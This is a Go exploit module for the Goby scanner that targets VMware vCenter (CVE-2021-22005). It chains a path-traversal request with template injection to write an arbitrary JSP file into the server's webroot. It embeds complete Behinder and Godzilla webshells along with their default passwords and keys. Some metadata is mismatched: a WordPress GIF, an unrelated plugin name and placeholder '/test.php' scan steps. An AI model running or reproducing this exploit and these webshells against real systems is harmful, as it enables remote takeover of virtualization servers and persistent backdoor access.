package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Description": "<p>VMware vCenter Server is a set of server and virtualization management software from VMware Corporation.</p><p>A remote code vulnerability exists in VMware vCenter Server that allows an attacker to upload a custom file to execute code.</p>",
    "Product": "vmware-VirtualCenter",
    "Homepage": "https://www.vmware.com/",
    "DisclosureDate": "2021-09-28",
    "Author": "m0x0is3ry@foxmail.com",
    "FofaQuery": "body=\"content=\\\"VMware VirtualCenter\" || body=\"content=\\\"VMware vSphere\" || title=\"vSphere Web Client\" || banner=\"vSphere Management \" || cert=\"dc=vsphere\" || body=\"url=vcops-vsphere\" || body=\"The vShield Manager requires\" || title=\"ID_VC_Welcome\"",
    "GobyQuery": "body=\"content=\\\"VMware VirtualCenter\" || body=\"content=\\\"VMware vSphere\" || title=\"vSphere Web Client\" || banner=\"vSphere Management \" || cert=\"dc=vsphere\" || body=\"url=vcops-vsphere\" || body=\"The vShield Manager requires\" || title=\"ID_VC_Welcome\"",
    "Level": "3",
    "Impact": "<p>A remote code vulnerability exists in VMware vCenter Server that allows an attacker to upload a custom file to execute code.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.vmware.com/\">https://www.vmware.com/</a></p>",
    "GifAddress": "https://raw.githubusercontent.com/gobysec/GobyVuls/master/WordPress/CVE-2021-24146/WordPress_Modern_Events_Calendar_Lite_file_export_CVE_2021_24146.gif",
    "References": [
        "https://kb.vmware.com/s/article/85717",
        "https://testbnull.medium.com/quick-note-of-vcenter-rce-cve-2021-22005-4337d5a817ee",
        "https://attackerkb.com/topics/15E0q0tdEZ/cve-2021-22005"
    ],
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "webshell,custom"
        },
        {
            "name": "webshell",
            "type": "select",
            "value": "behinder,godzilla",
            "show": "attackType=webshell"
        },
        {
            "name": "filename",
            "type": "input",
            "value": "abc.jsp",
            "show": "attackType=custom"
        },
        {
            "name": "content",
            "type": "input",
            "value": "<% out.println(\"hello\"); %>",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": null,
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Code Execution",
        "File Upload"
    ],
    "VulType": [
        "Code Execution",
        "File Upload"
    ],
    "CVEIDs": [
        "CVE-2021-22005"
    ],
    "CVSSScore": "9.8",
    "AttackSurfaces": {
        "Application": [
            "modern-events-calendar-lite"
        ],
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "CNNVD": [
        "CNNVD-202109-1486"
    ],
    "CNVD": [
        ""
    ],
    "Translation": {
        "CN": {
            "Name": "VMware vCenter agent 远程代码漏洞（CVE-2021-22005）",
            "Product": "vmware-VirtualCenter",
            "Description": "<p>VMware vCenter Server 是 Vmware 公司的一套服务器和虚拟化管理软件。<br></p><p>VMware vCenter Server 存在远程代码漏洞，攻击者可利用该漏洞上传自定义文件执行代码。<br></p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://www.vmware.com/\">https://www.vmware.com/</a></p>",
            "Impact": "<p>攻击者可通过该漏洞在服务器端写入后门，执行代码，获取服务器权限，进而控制整个 web 服务器。<br></p>",
            "VulType": [
                "代码执行",
                "文件上传"
            ],
            "Tags": [
                "代码执行",
                "文件上传"
            ]
        },
        "EN": {
            "Name": "VMware vCenter agent remote code vulnerability (CVE-2021-22005)",
            "Product": "vmware-VirtualCenter",
            "Description": "<p>VMware vCenter Server is a set of server and virtualization management software from VMware Corporation.</p><p>A remote code vulnerability exists in VMware vCenter Server that allows an attacker to upload a custom file to execute code.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:&nbsp;<a href=\"https://www.vmware.com/\">https://www.vmware.com/</a></p>",
            "Impact": "<p>A remote code vulnerability exists in VMware vCenter Server that allows an attacker to upload a custom file to execute code.<br></p>",
            "VulType": [
                "Code Execution",
                "File Upload"
            ],
            "Tags": [
                "Code Execution",
                "File Upload"
            ]
        }
    },
    "Name": "VMware vCenter agent remote code vulnerability (CVE-2021-22005)",
    "PostTime": "2023-09-11",
    "Is0day": false,
    "PocId": "10836"
}`

	sendPayloaddefb3fe2 := func(hostInfo *httpclient.FixUrl, filename, content string) (*httpclient.HttpResponse, error) {
		agent_name := goutils.RandomHexString(8)
		log_param := goutils.RandomHexString(8)
		secret := goutils.RandomHexString(8)
		cfg := httpclient.NewPostRequestConfig("/analytics/ceip/sdk/..;/..;/ph/api/dataapp/agent?_c=" + agent_name + "&_i=" + log_param)
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		cfg.Header.Store("X-Deployment-Secret", secret)
		cfg.Header.Store("Content-type", "application/json")
		_, err := httpclient.DoHttpRequest(hostInfo, cfg)
		if err != nil {
			return nil, err
		}

		cfgUpload := httpclient.NewPostRequestConfig("/analytics/ceip/sdk/..;/..;/ph/api/dataapp/agent?action=collect&_c=" + agent_name + "&_i=" + log_param)
		cfgUpload.VerifyTls = false
		cfgUpload.FollowRedirect = false
		cfgUpload.Header.Store("X-Deployment-Secret", secret)
		cfgUpload.Header.Store("Content-type", "application/json")
		var unicodeContent string
		for _, s := range content {
			unicodeContent += fmt.Sprintf("\\u%04x", int(s))
		}
		manifestContent := `<manifest recommendedPageSize="500">
       <request>
          <query name="vir:VCenter">
             <constraint>
                <targetType>ServiceInstance</targetType>
             </constraint>
             <propertySpec>
                <propertyNames>content.about.instanceUuid</propertyNames>
                <propertyNames>content.about.osType</propertyNames>
                <propertyNames>content.about.build</propertyNames>
                <propertyNames>content.about.version</propertyNames>
             </propertySpec>
          </query>
       </request>
       <cdfMapping>
          <indepedentResultsMapping>
             <resultSetMappings>
                <entry>
                   <key>vir:VCenter</key>
                   <value>
                      <value xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:type="resultSetMapping">
                         <resourceItemToJsonLdMapping>
                            <forType>ServiceInstance</forType>
                         <mappingCode><![CDATA[
                            #set($appender = $GLOBAL-logger.logger.parent.getAppender("LOGFILE"))##
                            #set($orig_log = $appender.getFile())##
                            #set($logger = $GLOBAL-logger.logger.parent)##
                            $appender.setFile("/usr/lib/vmware-sso/vmware-sts/webapps/ROOT/` + filename + `")##
                            $appender.activateOptions()##
                            $logger.warn("` + unicodeContent + `")##
                            $appender.setFile($orig_log)##
                            $appender.activateOptions()##]]>
                         </mappingCode>
                         </resourceItemToJsonLdMapping>
                      </value>
                   </value>
                </entry>
             </resultSetMappings>
          </indepedentResultsMapping>
       </cdfMapping>
       <requestSchedules>
          <schedule interval="1h">
             <queries>
                <query>vir:VCenter</query>
             </queries>
          </schedule>
       </requestSchedules>
    </manifest>`
		manifestContent = strings.ReplaceAll(manifestContent, `\`, `\\`)
		manifestContent = strings.ReplaceAll(manifestContent, `"`, `\"`)
		manifestContent = strings.ReplaceAll(manifestContent, "\n", `\n`)
		cfgUpload.Data = "{\"manifestContent\":\"" + manifestContent + "\"}"
		_, errUpload := httpclient.DoHttpRequest(hostInfo, cfgUpload)
		if errUpload != nil {
			return nil, errUpload
		}

		cfgCheck := httpclient.NewGetRequestConfig("/idm/..;/" + filename)
		cfgCheck.VerifyTls = false
		cfgCheck.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, cfgCheck)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			checkStr := goutils.RandomHexString(8)
			filename := goutils.RandomHexString(8) + ".jsp"
			rsp, err := sendPayloaddefb3fe2(u, filename, "<% out.println(\""+checkStr+"\");new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>")
			if err != nil {
				return false
			}
			return rsp.StatusCode == 200 && strings.Contains(rsp.Utf8Html, checkStr) && !strings.Contains(rsp.Utf8Html, "out.println")
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			content := goutils.B2S(ss.Params["content"])
			filename := goutils.B2S(ss.Params["filename"])
			attackType := goutils.B2S(ss.Params["attackType"])
			webshell := goutils.B2S(ss.Params["webshell"])
			if attackType == "webshell" {
				filename = goutils.RandomHexString(16) + ".jsp"
				if webshell == "behinder" {
					// /*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/
					content = `<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>`
				} else if webshell == "godzilla" {
					// 哥斯拉 pass key
					content = `<%! String xc="3c6e0b8a9c15224a"; String pass="pass"; String md5=md5(pass+xc); class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);} }public byte[] x(byte[] s,boolean m){ try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES");c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),"AES"));return c.doFinal(s); }catch (Exception e){return null; }} public static String md5(String s) {String ret = null;try {java.security.MessageDigest m;m = java.security.MessageDigest.getInstance("MD5");m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();} catch (Exception e) {}return ret; } public static String base64Encode(byte[] bs) throws Exception {Class base64;String value = null;try {base64=Class.forName("java.util.Base64");Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);value = (String)Encoder.getClass().getMethod("encodeToString", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Encoder"); Object Encoder = base64.newInstance(); value = (String)Encoder.getClass().getMethod("encode", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e2) {}}return value; } public static byte[] base64Decode(String bs) throws Exception {Class base64;byte[] value = null;try {base64=Class.forName("java.util.Base64");Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);value = (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Decoder"); Object decoder = base64.newInstance(); value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e2) {}}return value; }%><%try{byte[] data=base64Decode(request.getParameter(pass));data=x(data, false);if (session.getAttribute("payload")==null){session.setAttribute("payload",new X(this.getClass().getClassLoader()).Q(data));}else{request.setAttribute("parameters",data);java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();Object f=((Class)session.getAttribute("payload")).newInstance();f.equals(arrOut);f.equals(pageContext);response.getWriter().write(md5.substring(0,16));f.toString();response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));response.getWriter().write(md5.substring(16));} }catch (Exception e){} %>`
				}
			}
			rsp, err := sendPayloaddefb3fe2(expResult.HostInfo, filename, content)
			if err != nil {
				expResult.Success = false
				expResult.Output = err.Error()
				return expResult
			}
			// 资源存在
			if rsp.StatusCode != 200 && rsp.StatusCode != 500 {
				expResult.Success = false
				expResult.Output = "漏洞利用失败"
				return expResult
			}
			expResult.Success = true
			if attackType == "custom" {
				expResult.Output += "URL: " + expResult.HostInfo.FixedHostInfo + rsp.Request.URL.Path + "\n"
			} else {
				expResult.Output += "WebShell URL: " + expResult.HostInfo.FixedHostInfo + rsp.Request.URL.Path + "\n"
				if webshell == "behinder" {
					expResult.Output += "Password: rebeyond\n"
					expResult.Output += "WebShell tool: Behinder v3.0\n"
				} else if webshell == "godzilla" {
					expResult.Output += "Password: pass 加密器：JAVA_AES_BASE64\n"
					expResult.Output += "WebShell tool: Godzilla v4.1\n"
				}
				expResult.Output += "Webshell type: jsp"
			}
			return expResult
		},
	))
}